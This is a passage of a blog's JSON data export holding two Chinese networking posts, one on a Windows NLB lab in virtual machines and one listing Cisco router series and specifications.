href=\"http://technet.microsoft.com/zh-cn/library/cc784785%28WS.10%29.aspx\">http://technet.microsoft.com/zh-cn/library/cc784785%28WS.10%29.aspx</a></p>","site":{"data":{}},"excerpt":"","more":"<p>这两天被这个试验忙死了，居然钻错了方向。</p><p>NLB大致分为四个类型：1.单网卡多播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  2.单网卡单播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  3.多网卡多播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  4.多网卡单播</p><p>这是微软官方说的四种NLB类型。我做单播时候，虚拟机环境下没有做出来。每次重启网卡的时候就提示</p><p>Adapter Ethernet0 may not have network connectivity.MAC address 02:BF:C0:A8:05:01 of adapter Ethernet0 is within the reserved address range or is in use by another virtual adapter on your system.</p><p>一次和第二次分别down机时，可以完成冗余，在第三次切换的时候，无法连接，其他的没有问题了。不知道问题出在哪了，感觉应该是虚拟环境的问题。也没有多少技术含量。</p><p>注意一下几点：</p><p>1.使用NLB管理器的时候，应在本机把本机添加到群集中，不用在其他PC上操作本机。</p><p>2.单播群集里，不能进行通信。</p><p>3.NLB聚合后，不一定就意味着成功，自己测试一下。</p><p> </p><p>在做双网卡多播时，发现一下亮点。欢迎就这样的。</p><p>都属于baidu.com域中。节点一为域控，并在上面配置DNS。节点二为域成员。</p><p>AD：192.168.5.106 255.255.255.0  DNS:192.168.5.106</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  10.0.0.1  255.0.0.0 DNS:10.0.0.1</p><p>key；192.168.5.109 255.255.255.0 DNS：192.168.5.106</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  10.0.0.2  255.0.0.0  DNS：10.0.0.1</p><p> </p><p>测试PC：192.168.5.105  255.255.255.0 DNS：192.168.5.106</p><p>并在主机上做了WEB服务。</p><p>用域名访问没有问题。测试时，把AD的节点网卡DOWN掉，竟然能用域名访问，key的web页。我用NSLOOKUP解析，竟然解析不出来。以为是缓存的问题，把缓存清楚后，还可以。难道是key上面两卡的转换，也许就通过10.0.0.0/8网段解析的，那为什么NSLOOKUP不能解析呢，这问题就不多探讨了，当初应该把key的10.0.0.2网卡down掉，验证一下，现在也没有心思做了。</p><p>原理方面就去microsoft吧，地址奉上。</p><p><a href=\"http://technet.microsoft.com/zh-cn/library/cc784785%28WS.10%29.aspx\">http://technet.microsoft.com/zh-cn/library/cc784785%28WS.10%29.aspx</a></p>"},{"title":"思科Cisco 路由器型号剖析","date":"2010-03-26T07:47:00.000Z","_content":"<![CDATA[如：Cisco1721，Cisco2621，Cisco3662，Cisco3745。这些都是路由器。 比如：Cisco2621  其中Cisco：是品牌，后面的前两位数字是系列号，这款产品属于2600系列，后两位是具体的型号。<p>其中Cisco路由器有以下多个 系列：<br />Cisco2500系列：Cisco2501、Cisco2502、一直到Cisco2514，这些都是国内能见到的设备，再往上就是国外 的了，国内很少见到。<br />Cisco1700：1720、1721、1751、1760<br />Cisco1800：1821、1841<br />Cisco2600 系列：2610、2611、2620、2621、2651<br />Cisco2600XM系列：2610XM、2611XM、2620XM、2621XM<br />Cisco3600：3620、 3640、3660<br />Cisco3700：3725、3745<br />Cisco3800：3825、3845<br />Cisco7200：7204、 7206、7204VXR、7206VXR这些都是机箱，运用 当中须要 引擎的支持（NPE-225、NPE-300、NPE-400、NPE-G1、最新的是NPE-G2）和业务模块的支持。<br />Cisco7500：7507、 7513 同样也须要 引擎的支持（RSP2、RSP4、RSP8、RSP16）和业务模块的支持，7200上的业务模块都能在75上运用 ，须要 一块VIP卡的支持。</p><p>往上就是12000系列：12008，12016这些是目前最高端的。同样也须要 引擎和业务模块的支持。</p><p>思科路由器主要型号介绍：<br /><br />700系列&#160;&#160;&#160;&#160;&#160;&#160; ISDN路由器<br />-76x型:  1E(10baseT)+1*BRI(NT1)<br />-77x型: 4E(10baseT)+2个模拟电话端口(NT1)<br />-支持30个用户<br />---------------------------------------------------------------------<br />800 系列&#160;&#160;&#160;&#160;&#160;&#160;&#160; 采用CiscoIOS技能 的ISDN,IDSL和串行路由器<br />-1*BRI(可选的NT1)、IDSL或1端口串行<br />-可选的4端口以太网集线器和2个模拟电话端口(NT1型号)<br />-增强的安全特征 <br />----------------------------------------------------------------------<br />1000 系列&#160;&#160;&#160; 固定配置桌面访问路由器<br />-1E<br />-1*BRI(可选的NT1）或1端口同步或异步串行<br />----------------------------------------------------------------------<br /><u>1400</u>系 列&#160;&#160;&#160; ADSL路由器<br />-1E(10baseT)和1ATM-25(1401),或1E和1ADSL(DMT-2)(1417)<br />-旨在提供高达8Mbps的DSL访问<br />-Cisco端到端DSL处理 方案的一部份<br />----------------------------------------------------------------------<br />1600 系列&#160;&#160;&#160; 模块化桌面访问路由器<br />-1E or 2E(10baseT)<br />-1*BRI(可选的NT1)或1端口同步或异步串行<br />-1WIC槽<br />----------------------------------------------------------------------<br />1700 系列&#160;&#160;&#160; 灵活、安全的模块化访问路由器<br />-1FE<br />-模块化插槽支持广泛的广域网和模拟语音接口卡<br />-支持安全的Internet、Lan、Wan访问以及新广域网运用  ，包括<br />VPN、集成化语音/Voip和宽带<br />----------------------------------------------------------------------<br />2500 系列&#160;&#160;&#160; 固定配置及模块化配置访问路由器和服务器<br />-单或双Lan，EtherNet or TokengRing<br />-路由器/集线器或访问服务器<br />-单、双串行或高密度串行模型<br />----------------------------------------------------------------------<br />2600 系列&#160;&#160;&#160; 模块化访问路由器、语音数据网关和拨号访问服务器<br />-单或双Lan，EtherNet or  TokenRing<br />-与1600,1700和3600系列共享Wan Interface和网络模块。<br />-广泛的介质支持，包括异步和同步串行、ISDN、部分和多路T1/E1&#160;以太网、模拟调制解调器和ATM<br />----------------------------------------------------------------------<br />3300 系列&#160;&#160;&#160; 承载级SONET访问设备<br />-完全冗余的平台<br />-结合SONET可靠性和第三层意识<br />-以太网接口支持可以为桥接或路由配置的不同服务接口，并通过面<br />向集线器、交换机或路由器的10BaseT连接本地局域网<br />----------------------------------------------------------------------<br />3600 系列&#160;&#160;&#160; 模块化的高密度访问路由器<br />-2、4和6插槽型路由器<br />-广泛的介质支持，包括异步和同步串行、ISDN、多路T1/E1、以太<br />网、高速 以太网、令牌环网、数字调制解调器和ATM<br />-通过IP或帧中继提供语音/传真<br />----------------------------------------------------------------------<br />MC3810&#160;&#160;&#160;&#160;&#160;&#160;  小型低成本的多服务访问集中器<br />-1E和2端口串行<br />-6端口模拟或24/30端口数字语音<br />-数据、语音和视频集成<br />----------------------------------------------------------------------<br />4000 系列&#160;&#160;&#160;&#160;&#160;&#160;&#160; 模块化的高密度路由器<br />-适用于所有型号的3个插槽<br />-可以选择100-MHz或133-MHz处理器<br />-广泛的介质支持，包括异步和同步串行、ISDN、多路T1/E1、以太网、高速 以太网、令牌环网、FDDI、HSSI和ATM&#160;<br />----------------------------------------------------------------------<br />6400 系列&#160;&#160;&#160; 用于在POP或总部端接大量用户和多域服务的承载级集合设备<br />-每个平台多达14,000个用户端接<br />-L2TP、LAC/LNS、多域服务<br />-全ATM功能<br />----------------------------------------------------------------------<br />6700 系列&#160;&#160;&#160; 提供电路交换和基于包的语音/数据流量的集成化访问平台<br />-提供端到端集成化语音和数据服务的模块化,可伸缩的高密度平台<br />-5个用于RT和CPE运用  的线路卡插槽（6705）<br />-32个用于CO和RT运用  的线路卡插槽（6732）<br />----------------------------------------------------------------------<br />7100 系列&#160;&#160;&#160; 大型分支机构和中央站点VPN路由器<br />-彻底 的VPN服务套件，包括加密、隧道、防火墙及带宽管理<br />-方便部署的嵌入式I/O<br />-用于IPSec和PPTP加密协同处理的服务模块插槽<br />----------------------------------------------------------------------<br />7200 系列&#160;&#160;&#160; 提供智能服务、模块性、高性能和可伸缩性的广域网边缘路由器<br />-完全模块化、机箱式<br />-4或6插槽模型，可以选择三种系统处理器<br />-广泛的局域网和广域网选项，包括以太网，高速 以太网，100VG-<br />AnyLan、令牌环网、FDDI、串行、ISDN、HSSI、ATM、Packet&#160;over  DS3/E3<br />----------------------------------------------------------------------<br />7500 系列&#160;&#160;&#160; 主要的高端服务启动的核心及广域网集合路由器，适合企业及服务<br />供应商运用  中的语音、视频和数据<br />-5、7和13插槽模型<br />-1、2或4个总线模型，提供1、2或4Gbps背板<br />-广泛的局域网和广域网选项，包括以太网，高速 以太网，千兆<br />以太网、令牌环网、FDDI、串行、ISDN、HSSI、ATM、Packet&#160;over DS3/E3<br />----------------------------------------------------------------------<br />12000 系列&#160;&#160;&#160;&#160; 可伸缩的千兆们交换路由器(GSR)<br />-8、12或16插槽模型<br />-根据型号不同，提供40、60或80Gbps交换光纤<br />-为IP执行  了优化<br />-承载级</p>下面是多个 具体的系列的一些参数。<p>一.CISCO1700系列路由器</p><p>型号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 描述</p><p>CISCO1721&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络接口&#160;&#160; 、2个WIC插槽, 32M闪存/64M 内存</p><p>CISCO1760&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络接口&#160;&#160; 、4个WIC插槽&#160;&#160; 、19寸机箱、32M闪存/64M  内存</p><p>CISCO1760-V&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络\n接口&#160;&#160; 、4个WIC/VIC插槽、19寸机箱、32M闪存/96M  内存</p><p>CISCO1721-VPN/K9&#160;&#160;&#160;&#160;&#160;&#160; 1721 VPN Boundl 、VPN加快 卡、96MB内存、32MB闪存,VPN防火墙IOS软件</p><p>Cisco 1700系列模块化访问路由器为中小型企业和小型分支机构提供灵活、安全的访问处理 方案。Cisco 1700系列的模块化体系结构能运用 户定制一个满足其目前访问要求的安全访问处理 方案，能使他们经济有效地实施新运用  ，包括虚拟专网（VPN）访问、多服务语音/数据集成和宽带服务。集成的网络功能包括1个可选的防火墙、CSU/DSU和VPN特征 ，减少了部署及管理时间和努力。</p><p>Cisco 1721支持传统的数据访问运用  以及目前和未来的新广域网服务，包括VPN和宽带技能 。</p><p>除数据运用  之外，Cisco 1751还支持集成的多服务语音/传真/数据运用  。企业可以从一个稳健的数据访问处理 方案开始，然后在准备就绪时经济有效地集成语音和传真。<br />Cisco  1760模块化接入路由器为中小企业和小型企业个体分支机构提供多服务电子商务功能。思科系统公司隆重推出了Cisco  1760模块化接入路由器，这种路由器是中小企业和小型企业个体分支机构的理想接入处理 方案。Cisco  1760属于四插槽模块化接入路由器，安装在19寸机架中不但能提供安全的互联网和内部网接入，还能在同一个平台上实施多种电子商务和语音运用  。这些服务包括IP语音（VoIP）安全的虚拟专用网（VPN）接入和集成式防火墙，以及企业级数字用户线路（DSL）接入，该产品适用于许多行业和企 业。 借助Cisco1760，客户能够执行  安全的数据联网开始，并在须要 时移植到VoIP和IP电话服务。有了这种灵活性，除基本的互联网和内部网接入外，您还能销售增值服务，从而成为客户的战备联网合作伙伴.由于能引入新运 用  ，并在平台上修改或添加WAN和语音接口，因而能根据客户的需求添加服务并获得更多收入。Cisco1760运用 的Cisco IOS软件、WAN和语音接口卡与Cisco  1700、Cisco2600和Cisco3600路由器相同，不但降低了存储和支持要求，还能充分运用  您在销售和支持思科系统公司接入处理 方案方面积累的丰富体会 。二 .CISCO1800系列路由器</p><p>CISCO1841&#160;&#160;&#160; Modular Router w/2xFE, 2 WAN slots, 32 FL/128 DR</p><p>Cisco 1800系列集成多业务路由器以思科20年的领先地位和创新理念为基础，能够智能地将数据、安全性和无线技能 嵌入到同一个永续系统中，以便高速 、安全地将关键业务运用  提供给中小企业和小型分支机构。</p><p>Cisco 1800系列集成多业务路由器是屡获大奖的Cisco 1700系列路由器的下一代产品。Cisco  1801、1802、1803、1811和1812路由器运用 固定配置，Cisco 1841则运用 模块化配置。</p><p>因为有Cisco IOS软件，Cisco 1800系列路由器能够借助多种先进的安全服务和管理功能支持思科自防御网络，这其中包括硬件加密加快 、IPSec VPN（AES、3DES、DES）、防火墙保卫 、内部入侵防御（IPS）、网络准入控制（NAC）和URL过滤支持等。为简化管理和配置，Cisco  1800预装有基于Web的直观思科路由器和安全设备管理器（SDM）。</p><p>Cisco 1841集成多业务路由器：以线速提供安全的并发服务</p><p>Cisco 1841集成多业务路由器能够以线速提供安全的数据访问运用  ，从而为中小企业和小型分支机构提供全套功能和灵活性，以便实现安全的互联网和内部网接入。</p><p>与Cisco 7120和1721相比，Cisco 1841路由器不仅性能提高了五倍以上，还可通过新型结构 提供安全的并发服务，因而价值更高。运用  AIM、新型高速WAN接口卡（HWIC）和VWIC模块化特征 ，用户可以运用 多种连接形式 。另外，由于支持30多种现有的1700系列WAN接口卡（仅限WIC/VIC/VWIC数据模式），因而能够实现投资保卫 。</p><p>Cisco 1800系列固定配置型号：运用  冗余WAN链路为宽带接入提供安全的并发服务，Cisco  1800系列固定配置型号能够提供安全的宽带、城域以太网和无线连接。企业能够降低成本，因为只需部署一台设备就能提供多种功能，例如运用  集成冗余链路提供的DSL宽带接入、路由、LAN交换机、防火墙、VPN、IPS、无线局域网技能 以及一般由独立设备执行的服务质量（QoS）等。Cisco  1801、1802、1803集成多业务路由器不但能提供ADSL或G.SHDSL高速宽带接入，还能通过集成ISDN S/T  BRI备份保证网络的可靠性。Cisco 1811和1812通过两个10/100BaseT  WAN端口提供高速宽带和以太网接入，并通过V.92模拟调制解调器（Cisco 1811）或ISDN S/T BRI接口（Cisco  1812）提供集成WAN备份。</p><p>三 .CISCO2600系列路由器</p><p>CISCO2610XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2611XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2620XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2621XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p>CISCO2650XM&#160;&#160;&#160;&#160;1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、256M内存<p>CISCO2651XM&#160;&#160;&#160; 2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、256M内存</p><p>CISCO2691&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2个10/100M以太网络接口、1个NM模块插槽、3个WIC插槽、1个AIM插槽、32M闪存、256M内存</p><p>Cisco Systems通过Cisco 2600系列将企业级的通用性、集成和功能扩展到了建立 以机构。随着新服务和运用  的面市，Cisco 2600系列的模块化体系结构能够提供适应网络技能 变化所需的通用性。Cisco  2600系列配置了强大的RISC处理器，能够支持当今不断发展的网络中所需的高级服务质量（QoS）、安全和网络集成特征 。通过将多个独立设备的功能集成到一个单元之中，Cisco 2600系列降低了管理远程网络的复杂性。Cisco 2600系列与Cisco  1600、1700和3600系列共享模块化接口，为Internet、内部网访问、多服务语音/数据集成、模拟和数字拨号访问服务、VPN访问、ATM 访问集中、VLAN以及路由带宽管理等运用  提供经济有效的处理 方案。</p><p>四&#160;&#160; .CISCO2800系列路由器</p><p>CISCO2801&#160;&#160;&#160;&#160;&#160;&#160; 2801 Router/AC PWR,2FE,4slots(2HWICs),2AIMS,IP  BASE,64F/128D</p><p>CISCO2811&#160;&#160;&#160;&#160;&#160;&#160; 2811 w/ AC PWR,2FE,4HWICs,2PVDMs,1NME,2AIMS,IP  BASE,64F/256D</p><p>CISCO2821&#160;&#160;&#160;&#160;&#160;&#160; 2821 w/ AC PWR,2GE,4HWICs,3PVDM,1NME-X,2AIM,IP  BASE,64F/256D</p><p>CISCO2851&#160;&#160;&#160;&#160;&#160;&#160;&#160; 2851 w/ AC PWR,2GE,4HWIC,3PVDM,1NME-XD,2AIM,IP  BASE,64F/256D</p><p>Cisco 2800系列包括四个平台：Cisco 2801、Cisco 2811、Cisco 2821和 Cisco  2851。与价格类似的前几代思科路由器相比，Cisco  2800系列可以将性能提升五倍，将安全和话音性能提升十倍，并且可以提供新的嵌入式服务选项，因而可以为客户提供主要 的附加值。它可以在大幅度提升插槽性能和密度的同时，支持Cisco 1700和2600系列中现有的90多种模块。</p><p>五 .CISCO3600系列路由器</p><p>Cisco 3600系列是一个适合大中型企业Internet服务供应商的模块化、多功能访问平台家族。Cisco  3600系列拥有70多个模块化接口]\n]>","source":"_posts/思科Cisco-路由器型号剖析.md","raw":"title: 思科Cisco 路由器型号剖析\ncategories: [网络工程]\ntags: []\ndate: 2010-03-26 15:47:00\n---\n<![CDATA[如：Cisco1721，Cisco2621，Cisco3662，Cisco3745。这些都是路由器。 比如：Cisco2621  其中Cisco：是品牌，后面的前两位数字是系列号，这款产品属于2600系列，后两位是具体的型号。<p>其中Cisco路由器有以下多个 系列：<br />Cisco2500系列：Cisco2501、Cisco2502、一直到Cisco2514，这些都是国内能见到的设备，再往上就是国外 的了，国内很少见到。<br />Cisco1700：1720、1721、1751、1760<br />Cisco1800：1821、1841<br />Cisco2600 系列：2610、2611、2620、2621、2651<br />Cisco2600XM系列：2610XM、2611XM、2620XM、2621XM<br />Cisco3600：3620、 3640、3660<br />Cisco3700：3725、3745<br />Cisco3800：3825、3845<br />Cisco7200：7204、 7206、7204VXR、7206VXR这些都是机箱，运用 当中须要 引擎的支持（NPE-225、NPE-300、NPE-400、NPE-G1、最新的是NPE-G2）和业务模块的支持。<br />Cisco7500：7507、 7513 同样也须要 引擎的支持（RSP2、RSP4、RSP8、RSP16）和业务模块的支持，7200上的业务模块都能在75上运用 ，须要 一块VIP卡的支持。</p><p>往上就是12000系列：12008，12016这些是目前最高端的。同样也须要 引擎和业务模块的支持。</p><p>思科路由器主要型号介绍：<br /><br />700系列&#160;&#160;&#160;&#160;&#160;&#160; ISDN路由器<br />-76x型:  1E(10baseT)+1*BRI(NT1)<br />-77x型: 4E(10baseT)+2个模拟电话端口(NT1)<br />-支持30个用户<br />---------------------------------------------------------------------<br />800 系列&#160;&#160;&#160;&#160;&#160;&#160;&#160; 采用CiscoIOS技能 的ISDN,IDSL和串行路由器<br />-1*BRI(可选的NT1)、IDSL或1端口串行<br />-可选的4端口以太网集线器和2个模拟电话端口(NT1型号)<br />-增强的安全特征 <br />----------------------------------------------------------------------<br />1000 系列&#160;&#160;&#160; 固定配置桌面访问路由器<br />-1E<br />-1*BRI(可选的NT1）或1端口同步或异步串行<br />----------------------------------------------------------------------<br /><u>1400</u>系 列&#160;&#160;&#160; ADSL路由器<br />-1E(10baseT)和1ATM-25(1401),或1E和1ADSL(DMT-2)(1417)<br />-旨在提供高达8Mbps的DSL访问<br />-Cisco端到端DSL处理 方案的一部份<br />----------------------------------------------------------------------<br />1600 系列&#160;&#160;&#160; 模块化桌面访问路由器<br />-1E or 2E(10baseT)<br />-1*BRI(可选的NT1)或1端口同步或异步串行<br />-1WIC槽<br />----------------------------------------------------------------------<br />1700 系列&#160;&#160;&#160; 灵活、安全的模块化访问路由器<br />-1FE<br />-模块化插槽支持广泛的广域网和模拟语音接口卡<br />-支持安全的Internet、Lan、Wan访问以及新广域网运用  ，包括<br />VPN、集成化语音/Voip和宽带<br />----------------------------------------------------------------------<br />2500 系列&#160;&#160;&#160; 固定配置及模块化配置访问路由器和服务器<br />-单或双Lan，EtherNet or TokengRing<br />-路由器/集线器或访问服务器<br />-单、双串行或高密度串行模型<br />----------------------------------------------------------------------<br />2600 系列&#160;&#160;&#160; 模块化访问路由器、语音数据网关和拨号访问服务器<br />-单或双Lan，EtherNet or  TokenRing<br />-与1600,1700和3600系列共享Wan Interface和网络模块。<br />-广泛的介质支持，包括异步和同步串行、ISDN、部分和多路T1/E1&#160;以太网、模拟调制解调器和ATM<br />----------------------------------------------------------------------<br />3300 系列&#160;&#160;&#160; 承载级SONET访问设备<br />-完全冗余的平台<br />-结合SONET可靠性和第三层意识<br />-以太网接口支持可以为桥接或路由配置的不同服务接口，并通过面<br />向集线器、交换机或路由器的10BaseT连接本地局域网<br />----------------------------------------------------------------------<br />3600 系列&#160;&#160;&#160; 模块化的高密度访问路由器<br />-2、4和6插槽型路由器<br />-广泛的介质支持，包括异步和同步串行、ISDN、多路T1/E1、以太<br />网、高速 以太网、令牌环网、数字调制解调器和ATM<br />-通过IP或帧中继提供语音/传真<br />----------------------------------------------------------------------<br />MC3810&#160;&#160;&#160;&#160;&#160;&#160;  小型低成本的多服务访问集中器<br />-1E和2端口串行<br />-6端口模拟或24/30端口数字语音<br />-数据、语音和视频集成<br />----------------------------------------------------------------------<br />4000 系列&#160;&#160;&#160;&#160;&#160;&#160;&#160; 模块化的高密度路由器<br />-适用于所有型号的3个插槽<br />-可以选择100-MHz或133-MHz处理器<br />-广泛的介质支持，包括异步和同步串行、ISDN、多路T1/E1、以太网、高速 以太网、令牌环网、FDDI、HSSI和ATM&#160;<br />----------------------------------------------------------------------<br />6400 系列&#160;&#160;&#160; 用于在POP或总部端接大量用户和多域服务的承载级集合设备<br />-每个平台多达14,000个用户端接<br />-L2TP、LAC/LNS、多域服务<br />-全ATM功能<br />----------------------------------------------------------------------<br />6700 系列&#160;&#160;&#160; 提供电路交换和基于包的语音/数据流量的集成化访问平台<br />-提供端到端集成化语音和数据服务的模块化,可伸缩的高密度平台<br />-5个用于RT和CPE运用  的线路卡插槽（6705）<br />-32个用于CO和RT运用  的线路卡插槽（6732）<br />----------------------------------------------------------------------<br />7100 系列&#160;&#160;&#160; 大型分支机构和中央站点VPN路由器<br />-彻底 的VPN服务套件，包括加密、隧道、防火墙及带宽管理<br />-方便部署的嵌入式I/O<br />-用于IPSec和PPTP加密协同处理的服务模块插槽<br />----------------------------------------------------------------------<br />7200 系列&#160;&#160;&#160; 提供智能服务、模块性、高性能和可伸缩性的广域网边缘路由器<br />-完全模块化、机箱式<br />-4或6插槽模型，可以选择三种系统处理器<br />-广泛的局域网和广域网选项，包括以太网，高速 以太网，100VG-<br />AnyLan、令牌环网、FDDI、串行、ISDN、HSSI、ATM、Packet&#160;over  DS3/E3<br />----------------------------------------------------------------------<br />7500 系列&#160;&#160;&#160; 主要的高端服务启动的核心及广域网集合路由器，适合企业及服务<br />供应商运用  中的语音、视频和数据<br />-5、7和13插槽模型<br />-1、2或4个总线模型，提供1、2或4Gbps背板<br />-广泛的局域网和广域网选项，包括以太网，高速 以太网，千兆<br />以太网、令牌环网、FDDI、串行、ISDN、HSSI、ATM、Packet&#160;over DS3/E3<br />----------------------------------------------------------------------<br />12000 系列&#160;&#160;&#160;&#160; 可伸缩的千兆们交换路由器(GSR)<br />-8、12或16插槽模型<br />-根据型号不同，提供40、60或80Gbps交换光纤<br />-为IP执行  了优化<br />-承载级</p>下面是多个 具体的系列的一些参数。<p>一.CISCO1700系列路由器</p><p>型号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 描述</p><p>CISCO1721&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络接口&#160;&#160; 、2个WIC插槽, 32M闪存/64M 内存</p><p>CISCO1760&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络接口&#160;&#160; 、4个WIC插槽&#160;&#160; 、19寸机箱、32M闪存/64M  内存</p><p>CISCO1760-V&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络\n接口&#160;&#160; 、4个WIC/VIC插槽、19寸机箱、32M闪存/96M  内存</p><p>CISCO1721-VPN/K9&#160;&#160;&#160;&#160;&#160;&#160; 1721 VPN Boundl 、VPN加快 卡、96MB内存、32MB闪存,VPN防火墙IOS软件</p><p>Cisco 1700系列模块化访问路由器为中小型企业和小型分支机构提供灵活、安全的访问处理 方案。Cisco 1700系列的模块化体系结构能运用 户定制一个满足其目前访问要求的安全访问处理 方案，能使他们经济有效地实施新运用  ，包括虚拟专网（VPN）访问、多服务语音/数据集成和宽带服务。集成的网络功能包括1个可选的防火墙、CSU/DSU和VPN特征 ，减少了部署及管理时间和努力。</p><p>Cisco 1721支持传统的数据访问运用  以及目前和未来的新广域网服务，包括VPN和宽带技能 。</p><p>除数据运用  之外，Cisco 1751还支持集成的多服务语音/传真/数据运用  。企业可以从一个稳健的数据访问处理 方案开始，然后在准备就绪时经济有效地集成语音和传真。<br />Cisco  1760模块化接入路由器为中小企业和小型企业个体分支机构提供多服务电子商务功能。思科系统公司隆重推出了Cisco  1760模块化接入路由器，这种路由器是中小企业和小型企业个体分支机构的理想接入处理 方案。Cisco  1760属于四插槽模块化接入路由器，安装在19寸机架中不但能提供安全的互联网和内部网接入，还能在同一个平台上实施多种电子商务和语音运用  。这些服务包括IP语音（VoIP）安全的虚拟专用网（VPN）接入和集成式防火墙，以及企业级数字用户线路（DSL）接入，该产品适用于许多行业和企 业。 借助Cisco1760，客户能够执行  安全的数据联网开始，并在须要 时移植到VoIP和IP电话服务。有了这种灵活性，除基本的互联网和内部网接入外，您还能销售增值服务，从而成为客户的战备联网合作伙伴.由于能引入新运 用  ，并在平台上修改或添加WAN和语音接口，因而能根据客户的需求添加服务并获得更多收入。Cisco1760运用 的Cisco IOS软件、WAN和语音接口卡与Cisco  1700、Cisco2600和Cisco3600路由器相同，不但降低了存储和支持要求，还能充分运用  您在销售和支持思科系统公司接入处理 方案方面积累的丰富体会 。二 .CISCO1800系列路由器</p><p>CISCO1841&#160;&#160;&#160; Modular Router w/2xFE, 2 WAN slots, 32 FL/128 DR</p><p>Cisco 1800系列集成多业务路由器以思科20年的领先地位和创新理念为基础，能够智能地将数据、安全性和无线技能 嵌入到同一个永续系统中，以便高速 、安全地将关键业务运用  提供给中小企业和小型分支机构。</p><p>Cisco 1800系列集成多业务路由器是屡获大奖的Cisco 1700系列路由器的下一代产品。Cisco  1801、1802、1803、1811和1812路由器运用 固定配置，Cisco 1841则运用 模块化配置。</p><p>因为有Cisco IOS软件，Cisco 1800系列路由器能够借助多种先进的安全服务和管理功能支持思科自防御网络，这其中包括硬件加密加快 、IPSec VPN（AES、3DES、DES）、防火墙保卫 、内部入侵防御（IPS）、网络准入控制（NAC）和URL过滤支持等。为简化管理和配置，Cisco  1800预装有基于Web的直观思科路由器和安全设备管理器（SDM）。</p><p>Cisco 1841集成多业务路由器：以线速提供安全的并发服务</p><p>Cisco 1841集成多业务路由器能够以线速提供安全的数据访问运用  ，从而为中小企业和小型分支机构提供全套功能和灵活性，以便实现安全的互联网和内部网接入。</p><p>与Cisco 7120和1721相比，Cisco 1841路由器不仅性能提高了五倍以上，还可通过新型结构 提供安全的并发服务，因而价值更高。运用  AIM、新型高速WAN接口卡（HWIC）和VWIC模块化特征 ，用户可以运用 多种连接形式 。另外，由于支持30多种现有的1700系列WAN接口卡（仅限WIC/VIC/VWIC数据模式），因而能够实现投资保卫 。</p><p>Cisco 1800系列固定配置型号：运用  冗余WAN链路为宽带接入提供安全的并发服务，Cisco  1800系列固定配置型号能够提供安全的宽带、城域以太网和无线连接。企业能够降低成本，因为只需部署一台设备就能提供多种功能，例如运用  集成冗余链路提供的DSL宽带接入、路由、LAN交换机、防火墙、VPN、IPS、无线局域网技能 以及一般由独立设备执行的服务质量（QoS）等。Cisco  1801、1802、1803集成多业务路由器不但能提供ADSL或G.SHDSL高速宽带接入，还能通过集成ISDN S/T  BRI备份保证网络的可靠性。Cisco 1811和1812通过两个10/100BaseT  WAN端口提供高速宽带和以太网接入，并通过V.92模拟调制解调器（Cisco 1811）或ISDN S/T BRI接口（Cisco  1812）提供集成WAN备份。</p><p>三 .CISCO2600系列路由器</p><p>CISCO2610XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  